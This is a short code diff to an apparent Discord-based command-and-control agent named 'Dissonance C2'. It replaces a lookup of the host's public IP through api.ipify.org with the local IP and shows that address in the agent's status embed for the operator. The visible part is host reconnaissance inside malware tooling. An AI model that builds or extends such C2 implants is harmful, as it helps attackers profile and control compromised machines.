@@ -41,16 +41,9 @@ refresh_lock = asyncio.Lock()
 module_run_lock = asyncio.Lock()
 
 
-def public_ip():
-    try:
-        return requests.get(
-            "https://api.ipify.org",
-            timeout=5
-        ).text
-    except requests.RequestException:
-        return "Unknown"
 
-PUBLIC_IP = public_ip()
+
+LOCAL_IP = socket.gethostbyname(socket.getfqdn())
 OS = platform.system()
 
 intents = discord.Intents.default()
@@ -84,8 +77,8 @@ def embed():
     )
 
     e.add_field(
-        name="🌐 Public IP",
-        value=f"`{PUBLIC_IP}`",
+        name="🌐 Local IP",
+        value=f"`{LOCAL_IP}`",
         inline=True
     )
 
@@ -96,7 +89,7 @@ def embed():
     )
 
     e.set_footer(
-        text="Dissonance C2 • Agent Status"
+        text="Dissonance • Command-and-Control Agent"
     )
 
     return e
